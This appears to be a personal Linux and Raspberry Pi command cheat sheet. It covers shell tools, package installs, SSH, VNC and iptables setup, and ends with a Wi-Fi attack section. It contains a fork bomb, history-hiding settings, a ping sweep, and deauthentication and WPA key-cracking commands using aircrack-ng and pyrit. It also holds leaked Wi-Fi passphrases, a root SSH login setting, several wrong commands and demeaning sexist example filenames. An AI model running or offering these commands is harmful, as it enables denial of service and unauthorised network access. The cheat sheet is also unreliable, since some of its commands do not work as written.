#--------------------------------------------------------------------------------------------------------------------------------
# Linux crasher
:(){:|:&};:

# Pathname expansion
.   # Current directory
..  # Parent directory
~   # Home directory
-   # Previous directory

# Match list
[0123456789]

# Match range
[0-9]
[a-z]
[A-Z]

# Not match list
[!0123456789]

# Not match range
[!0-9]
[!a-z]
[!A-Z]

# Character classes
[[:digit:]]
[[:upper:]]
[[:lower:]]
[[:alpha:]]
[[:alnum:]]
[[:space:]]
[[:graph:]]
[[:print:]]
[[:punct:]]
[[:cntrl:]]
[[:xdigit:]]

{}


# Shell command history
history
!!			# Previous command
!n			# Particular command
!-n			# Nth previous command
!c			# Last command starting with c
c !*		# Use parameters from last command
sudo !!		# When forgetting sudo
Ctrl - r	# reverse i search, Ctrl - r

# Exclude commands preceeded by space from history .bash_profile
export HISTCONTROL=ignorespace
export HISTCONTROL=ignoredups
export HISTCONTROL=erasedups
export HISTCONTROL="ignorespace:ignoredups:erasedups"
export HISTIGNORE="history*"
export HISTIGNORE="history*:ls*"
export HISTTIMEFORMAT="%Y %h %d %H:%M:%S >>> "
export HISTSIZE=0
export HISTSIZE=-1



# manual for commands
man command

# clear the screen
clear

# Change directory to previous location
cd -

# Change directory to home location
cd ~

# output file contents
# -n number the lines
cat -n ./file.ext

# output file contents in reverse line order
# -n number the lines
tac -n ./file.ext

# output file contents in reverse
# -n number the lines
rev -n ./file.ext

# output the first n lines of file
# -n specify number of lines
head -n 20 ./file.ext

# output the last n lines of file
# -n specify number of lines
tail -n 20 ./file.ext

# not less than more
less ./file.ext

# not more than less
more ./file.ext

# search and filters based on patterns
# -n number the lines
# -i case insenitive search
# -v exclude search term
# -E extended regular expression
grep -in "find" ./file.ext
grep -vin "ignore" ./file.ext
grep 'deb http' /etc/apt/sources.list

# can extract data from columns or arrange rows into fields to extract needed data
# return the thrid, first and second columns from a file
# '{print $3 "\t" $1 "\t" $2}'
# -F delimiter character
awk '{print $3 "\t" $1 "\t" $2}' ./file.ext
# return the number of times each entry was encountered from the first field in a file
awk '{print $1}' ./filename.log | sort | uniq -c | sort -n
awk '{print $6}' ./filename.log | sort | uniq -c | sort -n
awk '{print $9}' ./filename.log | sort | uniq -c | sort -n
# count number of invalid login attempts from unique users 
cat auth.log | grep -in "input_userauth_request" | awk '{print $9}' | sort | uniq -c | sort -n

# stream editor performs find and replace
sed s/Find this/Replace that/ ./file.ext

# arranges order of output 
# -r reverse
# -n numeric
# -k key to sort by
# -u remove duplicates showing only unique
sort -rnk2 ./file.ext

# duplicate handling functions
# -c return the count of each unique entry
uniq -c

# word count
# word count lines in file
wc -l ./some.file

# translate input from pipe
| tr [:lower:] [:upper:] 

# redirection
# >1 standard output
# >2 standard error
# >>1 append standard output
# >>2 append standard error

# tape archive
# -c create
# -v verbose
# -f file
# -a compress acording to extension
# -x extract
# -C change to folder and extract
tar -cvf archive.tar ./Files\ or\ Folder/
tar -cavf archive.tar.gz ./Files\ or\ Folder/
tar -cavf archive.tar.bz2 ./Files\ or\ Folder/
tar -xavf archive.tar.gz -C ./folder

# remove criteria from file
cut 

# determine filetype
file 

# return the full path of an object in the path
which which

# update the filename access attributes of a file
touch young.sexy.virgin
ren young.sexy.virgin young.sexy.woman

# change owner
chown alpha-male young.sexy.woman

# change permission mode
chmod 700 young.sexy.woman

# create group
groupadd beta-males

# add user to group
usermod -aG group username

# change group
chgrp beta-males used.sexy.woman
ren young.sexy.woman used.sexy.woman
chmod 570 used.sexy.woman

ren used.sexy.woman crazy.cat.lady
chmod 457 crazy.cat.lady

pingsweep.sh
for ip in `seq 1 254`; do
ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
done


# find the disk usage of file from the current folder recursively and sort by file size
# -h human readable
# -d depth level
sudo du / -hd1
sudo tree

# free disk space
# -h human readable
df -h

watch df -h

# run previous command as sudo
sudo !!

# show partioning
fdisk -l

# free memory
# -h human readable
free -h
free | head -n 2 | awk '{print $3}'
free -h | head -n 3 | awk '{print $1, $4}'

watch free -h

# list distribution details
lsb_release -idrc
cat /etc/*{release,version}

# list hardware devices
sudo apt install lshw
lshw

# list and modify PCI devices
lspci
setpci

# list USB devices
lsusb

# list block devices
lsbk
blkid

# list cpu details
lscpu
cat /proc/cpuinfo

# list devices
sudo apt install procinfo
lsdev

# get and set storage device setting
hdparm

# push/pull bytes to address
outb
inb

# current shell process ID
echo $$
ls -lah /proc/$$
ls -lah /proc/$$/exe
ls -lah /proc/$$/cwd

# Kernel version
# -a all system information
uname -a

# locate command
which 

# find ethernet controller
lspci | grep -i ethernet

# list system control settings
sysctl

# exit from vim
:q!

# Encrypt file
aescrypt -e -p password plain.txt

# Decrypt file
aescrypt -d -p password cipher.text.aes

# Repeat a command until successful
while true
do
ping -c 1 www.google.co.uk > /dev/null 2>&1 && break
done;

# Display Output as a Table
mount | column –t

cat /etc/passwd | column -t -s:

# Sort Processes by Memory Usage
ps aux | sort -rnk 4

# Sort Processes by CPU Usage
ps aux | sort -nk 3

# Watch multiple logs
apt-get install multitail

# Create zero file of set size
dd if=/dev/zero of=out.txt bs=1M count=10

# Run last command as root
sudo !!

# Replace Spaces With Tabs
cat whitespaces.txt | tr ':[space]:' '\t' > blacktabs.txt
cat lowers.txt | tr a-z A-Z > UPPERS.txt

# Compress image files
find -name *.png -type f -print | xargs tar -cvzf images.tar.gz

# Download URL's
cat urls.txt | xargs wget
wget -i  urls.txt

# copy files to destination
ls /etc/*.conf | xargs -i cp {} /home/profile/Desktop/out

# Managing background tasks
operation1 &
Ctrl - Z
fg %1
Ctrl - Z
bg %1
operation2 &
Ctrl - Z
bg %2
jobs -l
operation3 &
Ctrl - Z
bg %3
jobs -l
kill -STOP %2
jobs -l
kill -CONT %2
jobs -l
disown %1
jobs -l
ps
kill %2 %3

# Environment variables
printenv
printenv SHELL
echo $SHELL

# Shell variables
set
set -o posix
set | less
set +o posix
unset

export shell2environment

#--------------------------------------------------------------------------------------------------------------------------------
# Shell scripting

nano script.sh
#--------------------------------------------------------------------------------------------------------------------------------
#!/bin/bash

# comment

echo "Shout!"

variable="Value"



func() {
       echo "$1 and $2 passed to function"
}

func "string"
func "string" 101
func $variable



control () {

	if [[ $1 = "value" ]]; then
		echo "variable has low $1"
	elif [[ $1 = "VALUE" ]]; then
		echo "variable has high $1"
	else
		read -p "Risk: " risk
		echo "variable has $risk of no value"
	fi
}

control $variable

#--------------------------------------------------------------------------------------------------------------------------------

chmod +x script.sh

./script.sh

#--------------------------------------------------------------------------------------------------------------------------------
# Cron jobs

crontab -l

crontab -e
*/minute 0-59 */hour 0-23 */day 1-31 */month 1-12 */week 0-7 Sunday to Sunday
*/1 * * * * every minute
15 * * * * 
0,30,45 * * * * every 15 minutes
0 0 * * 1-5 every week day

@hourly
@daily
@midnight
@reboot
@weekly
@annually@
@yearly

*/1 * * * * ./root/script.sh


#--------------------------------------------------------------------------------------------------------------------------------
#Raspberry Pi specifics
#https://www.raspberrypi.org/forums/viewtopic.php?f=66&t=133691

sudo date -s "MMM dd YYYY HH:mm"

#Set the timezone
sudo dpkg-reconfigure tzdata

#Boot from SD card or USB devicce
vcgencmd otp_dump | grep 17
#1020000a
cat program_usb_boot_mode=1 >> /boot/config.txt
sudo restart
#3020000a

#Register raspberrypi.local
sudo insserv avahi-daemon
sudo /etc/init.d/avahi-daemon restart

#Force NTP time update
sudo /etc/init.d/ntp stop
sudo ntpd -q -g
sudo /etc/init.d/ntp start

#Add additional DNS servers
sudo nano /etc/resolv.conf
 Generated by resolvconf
nameserver 127.0.0.1
nameserver 129.12.4.247
nameserver 129.250.35.250
nameserver 195.12.4.247
nameserver 158.43.240.3
nameserver 208.67.220.220
nameserver 195.74.128.6
nameserver 194.168.8.100
nameserver 62.8.96.38
nameserver 8.8.8.8
nameserver 4.2.2.6

# Raspbian server
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep x11 | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep python | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep sound | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep gnome | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep lxde | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep gtk | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep desktop | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep gstreamer | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep avahi | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep dbus | sed s/install//`
sudo apt-get -y remove `sudo dpkg --get-selections | grep -v "deinstall" | grep freetype | sed s/install//`
sudo apt-get -y autoremove
sudo apt-get clean

#Mount BerryBoot partition
sudo mkdir /berry
sudo mount /dev/mmcblk0p1 /berry

#Check internet connectivity
curl ipecho.net/plain ; echo

#Update to latest versions of installed software using apt-get
sudo rm /var/lib/apt/lists/* -vf
sudo rm /var/lib/dpkg/status
sudo touch /var/lib/dpkg/status
sudo apt-get install apt-transport-https
sudo apt-get autoremove -y && sudo apt-get clean
sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y
sudo raspi-config

#Install the collection of software required
sudo apt-get install libjs-sphinxdoc libjs-underscore libraspberrypi-bin libraspberrypi-dev libraspberrypi0 pi-bluetooth python-picamera python-sense-emu python3-picamera python3-sense-emu python-picamera-docs python-sense-emu-doc realvnc-vnc-viewer realvnc-vnc-server rpi-chromium-mods sense-hat

sudo apt-get install awscli gcloud


sudo apt-get install eclipse feedgnuplot golang gnuplot gnuplot-doc python-setuptools python3 python3-dev python3-nose python3-numpy python3-pip python3-scipy python-dev python-gnuplot python-matplotlib python-pip python-scipy python-sphinx python-sympy cmake cython3 build-essential cgroup-bin lazarus octave octave-info octave-doc octave-htmldoc pyflakes pylint git git-doc gfortran gfortran-4.9-doc libgfortran3-dbg libgnuplot-iostream-dev r-base-core r-recommended r-doc-info r-doc-pdf r-mathlib r-base-html
# download 1600MB space 3809MB

sudo apt-get install audacity blender calibre dia dvdauthor ghostscript ghostscript-x gimp gimp-help-en gimp-data-extras gnuradio inkscape libwidevinecdm0 libfreeimage-dev libfreetype6-dev librecad mesa-utils mixxx scribus scribus-doc scribus-template stellarium sweethome3d timidity timidity-daemon vlc vokoscreen imagemagick imagemagick-doc povray povray-includes povray-examples radiance radiance-doc radiance-materials tcsh kodi jack ardour qtractor hydrogen yoshimi rakarrack gladish puredata csound chuck shotwell subversion csound-utils laditools hydrogen-drumkits rubberband-cli a2jmidid stk javascript-common gem arc-theme papirus-icon-theme breeze-cursor-theme
# download 771MB space 1819MB

sudo apt-get install aircrack-ng apache2 apache2-doc avahi-daemon bridge-utils claws-mail dialog dnsmasq eject exfat-fuse ethtool filezilla nautilus gnucash gnumeric gnumeric-plugins-extra guile-2.0-doc help2man hostapd hydra iperf keepass2 keepass2-doc libboost-date-time-dev libboost-filesystem-dev libboost-locale-dev libboost-system-dev libcurl4-openssl-dev libdbus-1-dev libeigen3-dev libudev-dev macchanger matchbox-keyboard metacity nmap ntfs-3g openssh-server putty putty-doc pyrit qemu rsync tcpdump tcpreplay telnet tinyca unicode wbar wbar-config wireshark wireshark-doc xrdp xtightvncviewer zenmap pidgin-otr finger
#xdm xfce4 xfce4-terminal xfonts-base
# download 266MB space 859MB

sudo apt-get install beneath-a-steel-sky drascula drascula-music flight-of-the-amazon-queen lure-of-the-temptress scummvm scummvm-data libmpeg2-4
# download 186MB space 267MB

sudo apt-get install dosbox libasound2 libasound2-dev pokerth supertux supertuxkart torcs tuxguitar tuxguitar-alsa tuxguitar-jsa tuxguitar-oss tuxmath tuxpaint chuck desmume flightgear freeciv-client-extras freeciv-client-gtk freeciv-server freeciv-sound-standard freeciv-client-gtk libegl1-mesa libgl1-mesa-dev neverball openttd openttd-opengfx openttd-openmsx openttd-opensfx pmidi fluid-soundfont-gm fluid-soundfont-gs jack-tools jackd libsdl2-dev osspd libasound2 libasound2-dev joy2key higan yabause stella sudoku xine-ui 
# download 1904MB space 3352MB

sudo apt-get install apt-transport-https fdm freepats gitk gksu groff leafpad libapache2-mod-php5 libglew-dev libhtml-template-perl libipc-sharedcache-perl liblapack-dev liblinear-dev liblinear-tools libsvm-tools libvirt-bin lilypond lilypond-doc-pdf mcrypt meterbridge mysql-server nodejs npm openmpi-bin openshot php-pear php5 php5-cli php5-mcrypt php5-mysql php5-readline phpmyadmin qjackctl reaver scons skipfish ssh vagrant 


#Cleanup any software that is no longer required after updating
sudo apt-get autoremove

#List the connected USB devices
lsusb

#List the bulk storage devices
blkid

#Find and list any externally connected drives
sudo fdisk -l
#Make the mount directory and manage it's owner
sudo mkdir /media/pidrive
sudo chown pi:pi /media/pidrive
#Mount the drive as NTFS accessible
sudo mount -t ntfs-3g -o uid-pi,gid-pi /dev/sda /media/pidrive
#Now you're done but it's not permanent
 
#Making it permanent
#Edit file system table
sudo nano /etc/fstab
 
#Add this line of text after the SD card partitions
/dev/sda1   /media/pidrive  ntfs-3g uid=pi,gid=pi   0   0
#Press Ctrl-o to save and Ctrl-x to exit nano
 

#Clone the MiniNet GitHub repository
git clone git://github.com/mininet/mininet

#List interface configuration
ifconfig

#List network status
netstat -r

#To use an Android device as a KVM(Keyboard Video Mouse) for the Raspberry Pi
#Edit the network interfaces to assign a static IP address to a USB port
sudo nano /etc/network/interfaces

#Paste the following into the file, then save and exit (ctrl-X, Y):
auto lo
iface lo inet loopback

#auto eth0
#iface eth0 inet static
#address 192.168.144.42
#netmask 255.255.255.0
#network 192.168.144.0
#broadcast 192.168.144.255
#gateway 192.168.144.1

allow-hotplug wlan0
auto wlan0
iface wlan0 inet dhcp
wireless-power off
post-up iwconfig wlan0 power off
#    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf
wpa_ssid "WWWireless"
wpa_psk "w1r3l3s5"
auto wlan0
 
allow-hotplug wlan1
auto wlan1
iface wlan1 inet dhcp
post-up iwconfig wlan1 power off
#    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf
wpa_ssid "virginmedia3410484"
wpa_psk "glwlpxna"

#allow-hotplug usb0
#iface usb0 inet static
#address 192.168.42.42
#netmask 255.255.255.0
#network 192.168.42.0
#broadcast 192.168.42.255
#gateway 192.168.42.129



wpa_passpharse ssid passpharse

#Edit  the WPA Wi-Fi file to assign SSID's to specific interfaces
sudo nano /etc/wpa_supplicant/wpa_supplicant.conf

ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1
country=GB

network={
        ssid="WWWireless"
        psk="dzFyM2wzczU="
        key_mgmt=WPA-PSK
}

network={
        ssid="virginmedia3410484"
        psk="Z2x3bHB4bmE="
        key_mgmt=WPA-PSK
}



#Add a default gateway static route to use the network access of the Android device via USB tethering 
sudo route add default gw 192.168.42.129 usb0

#Remove any dynamic leases
sudo rm /var/lib/dhcp/*
sudo ip addr flush dev eth0
#Restart networking to apply the changes
sudo /etc/init.d/networking restart
sudo systemctl daemon-reload

#Allow root to login remotely via SSH
sudo nano /etc/ssh/sshd_config
#Change PermitRootLogin without-password
#to PermitRootLogin yes
#Press Ctrl-o to save and Ctrl-x to exit nano
sudo service ssh restart

#To enable permanant headless operation by using an Android device as a KVM
cd /etc/init.d
#Create a new file called vncboot. You’ll need root privileges to change anything in this directory.
sudo nano /etc/init.d/vncboot

#Paste the following into the file (change export USER=’pi’ to your username if not pi, and edit the screen resolution in the start) block if necessary):

#-------------------------
#! /bin/sh
### BEGIN INIT INFO
# Provides:          vncboot
# Required-Start:    $local_fs
# Required-Stop:     $local_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Run tightvnc on boot
### END INIT INFO

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin
export USER='pi'

eval cd ~$USER

. /lib/init/vars.sh
. /lib/lsb/init-functions

case "$1" in
  start)
    log_begin_msg "Starting VNC server"
    su $USER -c '/usr/bin/vncserver :1 -geometry 1280x720 -depth 24 -dpi 72'
    log_end_msg $?
    exit 0
    ;;
  stop)
    pkill Xtightvnc
    log_begin_msg "Stopping VNC server"
    log_end_msg $?
    exit 0
    ;;
  *)
    echo "Usage: /etc/init.d/vncboot {start|stop}"
    exit 1
    ;;
esac

#------------------
#Press Ctrl-o to save and Ctrl-x to exit nano
 
#Update the permissions of the file to make it executable
sudo chmod 755 /etc/init.d/vncboot

#Finally, run the following command to add it to your startup:
sudo update-rc.d vncboot defaults

#Changing the VNC server password
/usr/bin/tightvncpasswd

#Manully starting VNC server
tightvncserver

#Manually starting a VNC session from a shell script
nano vnc.sh
#!/bin/sh
vncserver :0 -geometry 1280x720 -depth 24 -dpi 72
#Press Ctrl-o to save and Ctrl-x to exit nano
chmod +x vnc.sh

#Export Xwindows to use applications via an Xwindows server 
export DISPLAY=192.168.42.129:0
export PULSE_SERVER=tcp:192.168.42.129:4712
metacity & gimp

#Enable USB tethering on Android device and connect using SSH or VNC
VNC to 192.168.42.42:1
SSH to 192.168.42.42

#Restart
sudo shutdown -r now



#--------------------------------------------------------------------------------------------------------------------------------
#Updating Debian based Linux distributions

cat /etc/*-release
source /etc/os-release
echo $UBUNTU_CODENAME
uname -a

sudo bash -c "echo 'vm.swappiness = 20' >> /etc/sysctl.conf"

sudo nano /etc/apt/sources.list

## SOURCES LIST FOR UBUNTU 16.04.x LTS XENIAL XERUS
## ALSO FOR XUBUNTU 16.04.x, LUBUNTU 16.04.x
## AND KUBUNTU 16.04.x
## From: http://sites.google.com/site/easylinuxtipsproject
## This list is for the Main server; you might want to select a
## faster mirror server closer to you, with Software & Updates.
## Only fit for 16.04.x LTS Xenial Xerus!
#
## SOURCES FOR ORDINARY UPDATES AND SOFTWARE:
deb http://archive.ubuntu.com/ubuntu xenial main
deb http://archive.ubuntu.com/ubuntu xenial-updates main
deb http://archive.ubuntu.com/ubuntu xenial restricted
deb http://archive.ubuntu.com/ubuntu xenial-updates restricted
deb http://archive.ubuntu.com/ubuntu xenial universe
deb http://archive.ubuntu.com/ubuntu xenial-updates universe
deb http://archive.ubuntu.com/ubuntu xenial multiverse
deb http://archive.ubuntu.com/ubuntu xenial-updates multiverse
#
## SOURCES FOR SECURITY UPDATES:
deb http://archive.ubuntu.com/ubuntu xenial-security main
deb http://archive.ubuntu.com/ubuntu xenial-security restricted
deb http://archive.ubuntu.com/ubuntu xenial-security universe
deb http://archive.ubuntu.com/ubuntu xenial-security multiverse
#
## BACKPORTS SOURCES (WITH LOWERED PRIORITY):
deb http://archive.ubuntu.com/ubuntu xenial-backports main
deb http://archive.ubuntu.com/ubuntu xenial-backports restricted
deb http://archive.ubuntu.com/ubuntu xenial-backports universe
deb http://archive.ubuntu.com/ubuntu xenial-backports multiverse
#
## PARTNER SOURCE (FOR SOFTWARE FROM
## PARTNERS OF CANONICAL):
deb http://archive.canonical.com/ubuntu xenial partner
#
## SOURCE FOR WEB BROWSER GOOGLE CHROME
## (DISABLED BY DEFAULT):
## Only enable it when you've installed Google Chrome!
## You can enable it in the application Software & Updates.
# deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main

wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
sudo sh -c 'echo "deb http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list'
sudo apt-get update
sudo apt-get install google-chrome-stable


sudo add-apt-repository ppa:mixxx/mixxx
sudo add-apt-repository ppa:kubuntu-ppa/backports 
sudo add-apt-repository ppa:c.falco/mame
sudo add-apt-repository ppa:hunter-kaller/ppa
sudo add-apt-repository ppa:libretro/stable
sudo add-apt-repository ppa:webupd8team/y-ppa-manager

sudo apt-get autoremove -y && sudo apt-get clean && sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y
sudo apt-get update && sudo apt-get autoremove -y && sudo apt-get clean && sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y

# Install some useful packages

wget -qO - https://packages.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
echo "deb http://packages.elastic.co/logstash/2.1/debian stable main" | sudo tee -a /etc/apt/sources.list
echo "deb http://packages.elastic.co/elasticsearch/2.x/debian stable main" | sudo tee -a /etc/apt/sources.list.d/elasticsearch-2.x.list

echo "deb http://download.virtualbox.org/virtualbox/debian `lsb_release -sc` contrib" | sudo tee -a /etc/apt/sources.list
echo "deb http://download.virtualbox.org/virtualbox/debian `grep "UBUNTU_CODENAME" /etc/os-release | awk -F '=' '{ print $2 }'` contrib" | sudo tee -a /etc/apt/sources.list

wget --output-document=/etc/apt/sources.list.d/medibuntu.list http://www.medibuntu.org/sources.list.d/$(lsb_release -cs).list
wget --output-document=/etc/apt/sources.list.d/medibuntu.list http://www.medibuntu.org/sources.list.d/$(grep "UBUNTU_CODENAME" /etc/os-release | awk -F '=' '{ print $2 }').list



sudo apt-get install aircrack-ng apache2 apt-transport-https audacity beneath-a-steel-sky blender bridge-utils build-essential burp calibre chuck claws-mail cmake cpu-checker cython3 desmume dia dnsmasq dopewars dopewars-data dosbox drascula drascula-music dvdauthor ethtool fceux feedgnuplot filezilla firefox flight-of-the-amazon-queen flightgear fluid-soundfont-gm fluid-soundfont-gs freeciv-client-extras freeciv-client-gtk freeciv-server freeciv-sound-standard freepats frozen-bubble frozen-bubble-data gddrescue gfortran ghostscript gimp git gitk gksu gnome-disk-utility gnome-video-arcade gnucash gnugo gnumeric gnuplot-doc golang graphviz-doc groff guile-1.8-doc hedgewars hedgewars-data higan hostapd hydra inkscape ipython ipython-notebook ipython3 jack-tools jackd jackd2-firewire joy2key julia kdenlive khelpcenter keepass2 krita qemu-kvm lazarus leafpad libasound2 libasound2-dev libboost-date-time-dev libboost-filesystem-dev libboost-locale-dev libboost-system-dev libcurl4-openssl-dev libegl1-mesa libeigen3-dev libfreeimage-dev libfreetype6-dev libgl1-mesa-dev libglew-dev libgnuplot-iostream-dev libhtml-template-perl libipc-sharedcache-perl liblapack-dev liblinear-dev liblinear-tools librecad libsdl2-dev libsvm-tools libvirt-bin lilypond lilypond-doc lilypond-doc-html lilypond-doc-pdf lure-of-the-temptress lynx-cur macchanger mame mame-extra mame-tools mcrypt mednafen mess mess-data mess-desktop-entries meterbridge mininet mixxx mupen64plus mysql-server nexuiz nexuiz-data nexuiz-music nexuiz-server nexuiz-textures nmap nodejs npm ntfs-3g nvidia-cg-toolkit octave openhackware openmpi-bin openshot openshot-doc openssh-server openttd openttd-opengfx openttd-openmsx openttd-opensfx osspd pidgin-otr playonlinux pmidi pokerth pokerth-data pokerth-server pong2 prboom-plus prboom-plus-game-server pulseaudio-esound-compat putty pyrit python-dev python-gnuplot python-matplotlib python-pip python-scipy python-sphinx python-sympy python3 python3-dev python3-nose python3-numpy python3-pip python3-scipy python3-setuptools qemu qgo qjackctl quake quake-server quake2 quake2-server quake3 quake3-server quakespasm r-base-core r-recommended reaver rott rsync samba scons screen scribus scribus-doc scribus-template scummvm scummvm-data sqlmap skipfish ssh stella stellarium sudoku supertux supertux-data supertuxkart supertuxkart-data sudoku sweethome3d telnet tightvncserver timidity timidity-daemon tinyca tmux torcs torcs-data torcs-data-cars torcs-data-tracks tuxguitar tuxguitar-alsa tuxguitar-jsa tuxguitar-oss tuxpaint tumiki-fighters tumiki-fighters-data tuxfootball tuxmath tuxmath-data tuxpuck tuxtype tuxtype-data ubuntu-drivers-common uhexen2 uhexen2-common unicode vagrant vbaexpress virtinst virtualbox virtualbox-dkms virtualbox-guest-additions-iso virtualbox-guest-dkms virtualbox-guest-utils virtualbox-qt visualboyadvance visualboyadvance-gtk vlc vokoscreen vorbis-tools winetricks wireshark wolf4sdl x264 xtightvncviewer xqf yabause zenmap jack ardour qtractor hydrogen yoshimi rakarrack gladish puredata supercollider csound chuck mypaint darktable shotwell mypaint-data-extras account-plugin-facebook account-plugin-google account-plugin-flickr unity-control-center-signon subversion csound-utils laditools hydrogen-drumkits rubberband-cli a2jmidid stk javascript-common gem supercollider-supernova ubuntu-edu-preschool ubuntu-edu-primary ubuntu-edu-secondary ubuntu-edu-tertiary vde2 vde2-cryptcab

#fdm xdm xfce4 xfce4-terminal 

sudo apt-get autoremove
sudo update-rc.d elasticsearch defaults 95 10


#Install Python3 libraries
sudo apt-get install python3-dev python3-pip python3-setuptools
sudo pip3 install --upgrade pip setuptools
sudo pip3 install -U `pip3 list --outdated | awk '{ print $1}'`
sudo pip3 install --upgrade awscli bitcoin blockchain boto3 certifi datalab decorator ethereum gcloud gevent greenlet ipython ipython-genutils jinja2 joystick nose pickleshare pynput pygobject pyparsing pyreadline python-dateutil pytz pyzmq simplegeneric six tensorflow tornado traitlets

pillow pwntools


#Install Python2 libraries
sudo apt-get install python-dev python-pip python-setuptools
sudo pip install --upgrade pip setuptools
sudo pip install -U `pip list --outdated | awk '{ print $1}'`
sudo pip install --upgrade awscli bitcoin blockchain boto bx-python cheetah cython datalab ethereum freeze gcloud ipython jsonschema list matplotlib mininet notebook numpy pycrypto pysqlite pyzmq ryu scipy tornado pwntools

#--------------------------------------------------------------------------------------------------------------------------------
#Setting up and connecting to a Linux SSH server

#Install the SSH server
sudo apt-get install openssh-server


#Create the SSH authentication key pair

ssh-keygen -t rsa -C "me@here.local"

ssh-copy-id 

mkdir ~/.ssh

touch ~/.ssh/authorized_keys

chmod go-w ~/

chmod 700 ~/.ssh

chmod 600 ~/.ssh/authorized_keys

#Disable SSH password prompt

#edit
/etc/ssh/sshd_config
#change
PermitRootLogin yes
#to
PermitRootLogin without-password

reload ssh





#--------------------------------------------------------------------------------------------------------------------------------
#SSH PortForwarding

#Configure Simple SSH Port-Forwarding

#Run these commands on the server that will be performing the port forwarding.

#1. Enable IP Forwarding
sudo sysctl net.ipv4.ip_forward=1
#2. Forward traffic on port 1111 to IP 192.168.144.42 on port 22
sudo iptables -t nat -A PREROUTING -p tcp --dport 1111 -j DNAT --to-destination 192.168.144.42:22
dport = incoming port that will forward the traffic

#to-destination = server IP address and port that you are forwarding to

#3. Ask iptables to Masquerade
 sudo iptables -t nat -A POSTROUTING -j MASQUERADE
#4. Test
#From the client PC, SSH to the server that is doing the port forwarding.  If the server doing the port forwarding is 192.168.42.42, then ssh to 192.168.42.42:1111.  You should be connected to 192.168.144.42 via SSH (port 22).

#5. Save iptables rules
sudo sh -c "iptables-save > /etc/iptables.rules"
#6. Automatically apply iptables rules at startup
#a. Edit the interface the rules apply to by editing /etc/network/interfaces

#At the end of the network related lines for that interface, add the line:

#pre-up iptables-restore < /etc/iptables.rules
b. Edit /etc/sysctl.conf by adding the line net.ipv4.ip_forward = 1.

 

 

#If you want to keep information from byte and packet counters, use the command:
sudo sh -c "iptables-save -c > /etc/iptables.rules"

#List PREROUTING Rules
sudo iptables -t nat {--line-numbers} -L

#Delete NAT Rule
sudo iptables -t nat -D PREROUTING [line #]

#Note: The option "-t nat" are not needed when you want to delete POSTROUTING, INPUT, or OUTPUT rules.



#--------------------------------------------------------------------------------------------------------------------------------
# rsync

rsync -av . me@here.remote:~/fromthere



#--------------------------------------------------------------------------------------------------------------------------------
#Linux networking commands

ifconfig eth0

#Show all active and inactive interfaces
ifconfig -a

#Show only wireless interfaces
iwconfig

#Change interface state
ifconfig eth0 down
ifdown eth0
ifconfig eth0 up
ifup eth0

#Change interface settings
ifconfig eth0 192.168.0.24
ifconfig eth0 netmask 255.255.255.0
ifconfig etho broadcast 192.168.0.64
ifconfig eth0 hw ether 00:00:00:00:00:00
ifconfig eth0 172.16.25.125 netmask 255.255.255.224 broadcast 172.16.25.63
ifconfig eth0 mtu 1500
ifconfig eth0 hw ether AA:BB:CC:DD:EE:FF

#Setting promiscuous mode
ifconfig eth0 promisc
ifconfig eth0 -promisc

#Add New Alias to Network Interface
ifconfig eth0:0 172.16.25.127
ifconfig eth0:0
ifconfig eth0:0 down



#--------------------------------------------------------------------------------------------------------------------------------
#Using the AirCrack suite to decrypt access point packet captures

#Installing the AirCrack suite

sudo apt-get install aircrack-ng



#Enabling monitor mode

sudo airmon-ng check kill
sudo airmon-ng start wlan1



#Disabling monitor model

sudo airmon-ng stop wlan1
sudo service network-manager start



#--------------------------------------------------------------------------------------------------------------------------------
#Changing the interface MAC address and capturing packets

sudo apt-get install macchanger
ifconfig wlan1 down
sudo macchanger -r wlan1
ifconfig wlan1 up

sudo airmon-ng check kill
sudo airmon-ng start wlan1

#Listen using the monitor interface

sudo airodump-ng wlan1mon

#Listen to a specific access point on a specific channel using the monitor interface

sudo airodump-ng --channel 44 --bssid 00:00:00:00:00:00 --write ./packet.cap wlan1mon

#Inject deauthentication packets to disconnect a client from an access point

sudo aireplay-ng --deauth 2000 -a 00:00:00:00:00:00 -c 00:00:00:00:00:01 wlan1mon

#Use AirCrack to attempt to find the access point key in the capture file from a password list

sudo aircrack-ng ./packet.cap -w ./passwords.list

#Decrypt a packet capture file using the recovered access point key

sudo airdecap-ng -e 'ACCESSPOINT' -p password ./packet.cap



#--------------------------------------------------------------------------------------------------------------------------------
#Using Pyrit to attempt to find the access point key in a capture file

sudo apt-get install pyrit
pyrit list_cores
sudo pyrit -r ./packet.cap analyze
sudo pyrit -i ./passwords.list import_passwords
sudo pyrit -e ACCESSPOINT create_essid
pyrit eval
pyrit batch
sudo pyrit -r ./packet.cap attack_db
sudo pyrit -e ACCESSPOINT delete_eesid
sudo rm -rf .pyrit/blobspace/password/



#--------------------------------------------------------------------------------------------------------------------------------
#Using Reaver to recover WPS access point key

